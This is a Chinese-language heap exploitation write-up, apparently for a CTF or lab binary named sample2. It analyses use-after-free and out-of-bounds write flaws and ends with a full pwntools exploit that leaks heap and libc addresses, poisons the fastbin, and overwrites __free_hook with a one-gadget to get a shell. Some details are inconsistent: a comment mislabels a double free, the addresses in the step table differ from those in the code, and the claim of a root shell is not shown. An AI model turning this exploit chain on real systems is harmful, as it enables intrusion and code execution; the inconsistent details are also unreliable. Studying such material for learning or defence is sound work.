- **保护机制**：

  - 部分RELRO（全局指针数组地址固定）
  - 无PIE（代码段地址固定，如0x400000）

- **依赖库**：使用glibc（版本推测为2.23，基于libc地址和符号）
- **运行要求**：需要标准输入/输出，程序通过菜单交互管理堆内存
- **检查命令结果推断**：
  - `file`：ELF 64-bit LSB executable
  - `checksec`：部分保护启用，但堆漏洞可利用
  - `ldd`：依赖libc.so.6等标准库

## 漏洞成因
程序存在多个内存破坏型漏洞，主要成因如下：

### 关键数据结构
- **全局指针数组 `ptr`**：地址`0x6020a0`，存储10个堆块指针（每个8字节），索引0-9
- **全局变量 `dword_6020B0`**：地址`0x6020b0`，用于计数编辑操作（最大3次）
- **堆块布局**：每个分配块大小为0x20字节（实际堆块大小0x31含头）

### 漏洞分析
1. **Use-after-Free (UAF) 漏洞**
   - **位置**：`sub_400B54`（释放函数）和`sub_400A79`（编辑函数）
   - **原因**：释放堆块后未将`ptr`数组对应指针置空，导致悬空指针。用户可通过编辑或显示函数读写已释放内存，造成堆数据损坏。
   - **反编译代码证据**：释放函数中仅调用`free`，无指针清空操作；编辑函数直接使用`ptr[v1]`写入。

2. **越界写入漏洞**
   - **位置**：`sub_400A79`（编辑函数）中的索引检查
   - **原因**：索引`v1`允许范围0-0x1F（31），但`ptr`数组只有10个元素（索引0-9）。索引10-31可越界访问全局内存，若该位置有非空值，会导致任意地址写入。
   - **反编译代码证据**：索引检查`if ( v1 <= 31 )`，但未验证数组边界。

3. **全局变量覆盖漏洞**
   - **位置**：`sub_4009A0`（分配函数）和`sub_400A79`（编辑函数）
   - **原因**：内存布局中`dword_6020B0`位于`ptr[2]`位置。分配索引2时会覆盖`dword_6020B0`为堆指针，编辑索引2会递增该指针（通过`++dword_6020B0`），可能导致指针失效。
   - **反编译代码证据**：分配函数直接设置`ptr[v1] = malloc(0x20)`；编辑函数检查`dword_6020B0 != 3`后递增。

**根本原因**：缺乏安全的指针管理和边界检查，使攻击者可利用UAF和越界写入实现任意地址读写，最终劫持控制流。

## 漏洞利用过程
利用过程通过12个步骤实现，结合调试记录中的内存变化，关键堆内存状态变化如下表：

| 步骤 | 操作 | 内存关键变化 | 利用目的 |
|------|------|---------------|----------|
| 1 | `malloc(0); malloc(1); free(1); free(0)` | 堆块0和1释放到fastbin，形成链表：`0x2b84a000 → 0x2b84a030 → 0x0` | 创建UAF条件，为fastbin攻击做准备 |
| 2 | `puts(0)` | 通过UAF读取堆块0的fd指针，泄露堆地址`heap_addr` | 获取堆基址，用于计算伪造堆块位置 |
| 3 | `edit(0, py1)` | 覆盖堆块0的fd为`heap_addr+0x20`，并在`0x2b84a020`创建伪造堆块头（size=0x31） | 构造伪造fastbin链表，指向可控内存 |
| 4 | `malloc(6); malloc(7); malloc(2); malloc(3)` | 重新分配堆块，消耗fastbin，堆块7设置size=0xa1为后续unsorted bin攻击准备 | 布局堆内存，创建不同大小的堆块 |
| 5 | `malloc(4, py2)` | 分配堆块4并写入伪造数据（fd=0x602068, bk=0x602070） | 指向全局区域，为任意地址写入做准备 |
| 6 | `malloc(5, py3)` | 分配堆块5并写入size数据（0x30） | 巩固堆布局，确保伪造结构有效 |
| 7 | `free(1)` | 释放堆块1到unsorted bin，fd/bk指向main_arena+88 | 泄漏libc地址的关键步骤 |
| 8 | `puts(1)` | 通过UAF读取堆块1的fd，获取`main_arena`地址 | 计算libc基址和one-gadget地址 |
| 9 | `edit(4, p64(free_hook))` | 覆盖堆块4的数据为`free_hook`地址 | 准备覆盖`__free_hook`以劫持控制流 |
| 10 | `edit(1, p64(onegadget))` | 覆盖堆块1的数据为one-gadget地址 | 将one-gadget写入待触发位置 |
| 11 | `free(2)` | 触发free操作，执行`__free_hook`中的one-gadget | 获取shell，控制流劫持成功 |
| 12 | `p.interactive()` | 内存映射完全替换为`/bin/dash`，进程以root权限运行 | 交互式shell环境建立 |

**内存变化总结**：
- **堆布局**：从初始空状态到复杂链表，通过伪造堆块实现任意地址分配。
- **libc泄漏**：利用unsorted bin的fd/bk指向main_arena，计算libc基址。
- **控制流劫持**：覆盖`__free_hook`为one-gadget，触发free时执行shellcode。
- **最终状态**：进程成功执行`execve("/bin/dash")`，内存映射替换，获得root shell。

## Exploit
以下是完整的漏洞利用脚本，在关键位置添加注释解释利用逻辑：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample2')
p = process('./data/sample2')
libc = elf.libc  # 获取程序使用的libc

# 定义便捷函数
sl = lambda s : p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s : p.send(s.encode() if isinstance(s, str) else s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode() if isinstance(s, str) else s)
ti = lambda : p.interactive()

# 封装程序功能函数
def malloc(index, Content):
    ru("Choice:")
    sl('1')  # 选择分配操作
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)

def free(Index):
    ru("Choice:")
    sl('4')  # 选择释放操作
    ru("Index:")
    sl(str(Index))

def puts(Index):
    ru("Choice:")
    sl('3')  # 选择显示操作
    ru("Index:")
    sl(str(Index))

def exit():
    ru("Choice:")
    sl('5')  # 退出程序

def edit(index, Content):
    ru("Choice:")
    sl('2')  # 选择编辑操作
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)

# 步骤1: 分配并释放两个堆块，创建fastbin链表
malloc(0, b'aaaaaaaa\n')
malloc(1, b'bbbbbbbb\n')
free(1)
free(0)  # 双重释放，形成fastbin: 0->1->NULL

# 步骤2: 通过UAF读取堆块0的fd指针，泄露堆地址
puts(0)
heap_addr = u64(rc(4).ljust(8, b'\x00')) - 0x30  # 解析堆地址，调整基址

# 步骤3: 编辑堆块0，伪造fastbin链表指向可控内存
py1 = p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31)  # 构造伪造堆块头
edit(0, py1)  # 覆盖fd指向heap_addr+0x20，并设置伪造size

# 步骤4: 重新分配堆块，布局堆内存
malloc(6, b'aaa\n')  # 消耗fastbin，获取堆块0
malloc(7, p64(0) + p64(0xa1) + b'\n')  # 分配堆块7，设置size=0xa1为unsorted bin准备
malloc(2, b'cccccccc\n')  # 分配堆块2
malloc(3, b'dddddddd\n')  # 分配堆块3

# 步骤5: 分配堆块4并写入伪造指针，指向全局区域
FD = 0x602080 - 24  # 计算伪造fd指针（全局区域）
BK = 0x602080 - 16  # 计算伪造bk指针
py2 = p64(0) + p64(0x31) + p64(FD) + p64(BK)  # 构造伪造堆块数据
malloc(4, py2)  # 分配堆块4，写入伪造指针

# 步骤6: 分配堆块5，巩固堆布局
py3 = p64(0x30) + p64(0x30) + b'\n'
malloc(5, py3)

# 步骤7: 释放堆块1到unsorted bin，泄漏libc地址
free(1)  # 堆块1进入unsorted bin，fd/bk指向main_arena

# 步骤8: 通过UAF读取堆块1的fd，获取main_arena地址
puts(1)
main_arena = u64(rc(6).ljust(8, b'\x00')) - 88  # 解析main_arena地址
libc_base = (main_arena & 0xfffffffff000) - 0x3c4000  # 计算libc基址（基于偏移）
onegadget = libc_base + 0x4527a  # 计算one-gadget地址（具体偏移可能需调整）
free_hook = libc_base + libc.symbols["__free_hook"]  # 获取__free_hook地址

# 步骤9: 编辑堆块4，覆盖数据为free_hook地址
edit(4, p64(free_hook) + b'\n')  # 准备覆盖__free_hook

# 步骤10: 编辑堆块1，写入one-gadget地址
edit(1, p64(onegadget) + b'\n')  # 将one-gadget写入待触发位置

# 步骤11: 释放堆块2，触发free_hook执行one-gadget
free(2)  # 触发控制流劫持，执行one-gadget获取shell

# 步骤12: 进入交互模式，使用shell
p.interactive()
```

### 关键注释说明：
- **堆地址泄露**：步骤2利用UAF读取fastbin的fd指针，计算堆基址。
- **伪造堆块**：步骤3编辑已释放堆块，构造恶意fastbin链表，实现任意地址分配。
- **libc泄漏**：步骤7-8利用unsorted bin的fd/bk指向main_arena的特性，泄漏libc地址。
- **控制流劫持**：步骤9-11覆盖`__free_hook`为one-gadget，触发free时执行shellcode。
- **利用成功**：最终通过`p.interactive()`进入交互式shell，证明漏洞利用完全成功。

此exp综合利用了UAF、越界写入和全局变量覆盖漏洞，通过堆布局和内存破坏实现了从任意地址读到代码执行的全链条利用。
